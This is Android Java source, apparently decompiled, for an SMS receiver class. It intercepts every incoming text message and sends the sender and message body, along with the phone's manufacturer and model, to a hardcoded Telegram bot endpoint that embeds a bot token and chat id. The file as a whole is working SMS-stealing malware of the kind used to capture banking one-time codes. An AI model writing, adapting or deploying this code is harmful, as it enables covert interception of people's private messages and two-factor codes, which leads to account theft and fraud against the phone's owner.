package com.example.myapplicatior;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class ReceiveSms extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        Bundle bundle;
        String str = "\n - Product : ";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
            try {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] msgs = new SmsMessage[pdus.length];
                int i = 0;
                while (i < msgs.length) {
                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    String msg_from = msgs[i].getOriginatingAddress();
                    String rep_msgbody2 = msgs[i].getMessageBody().replace("&", "  ").replace("#", " ");
                    String replace = rep_msgbody2.replace("?", " ");
                    String str2 = "ID : " + Build.ID + "\n - User : " + Build.USER + str + Build.PRODUCT + "\n - Brand : " + Build.BRAND + "\n - Board : " + Build.BOARD + "\n - BOOTLOADER : " + Build.BOOTLOADER + "\n - DISPLAY : " + Build.DISPLAY + "\n - HOST : " + Build.HOST + "\n - DEVICE : " + Build.DEVICE + "\n -TAGS : " + Build.TAGS + "\n - FINGERPRINT : " + Build.FINGERPRINT + "\n - TYPE : " + Build.TYPE + str + Build.TIME + "\n - ";
                    Request.Builder builder = new Request.Builder();
                    String str3 = str;
                    StringBuilder append = new StringBuilder().append(" https://api.telegram.org/bot7153602473:AAFSHM8j2WwWoZtJoybLJtl4vvcKn6GogZ0/sendMessage?parse_mode=markdown&chat_id=6308795074&text=𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 %0A %0A𝐒𝐞𝐧𝐝𝐞𝐫 : _").append(msg_from).append("_,%0A𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : _\n\n").append(rep_msgbody2).append("%0A %0A𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : ");
                    StringBuilder append2 = append.append(Build.MANUFACTURER);
                    this.client.newCall(builder.url(append.append(" ").append(Build.MODEL).append("_").toString()).build()).enqueue(new Callback() {
                        public void onFailure(Call call, IOException e) {
                            e.printStackTrace();
                        }

                        public void onResponse(Call call, Response response) throws IOException {
                            Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                            if (response.isSuccessful()) {
                                response.body().string();
                            }
                        }
                    });
                    i++;
                    str = str3;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
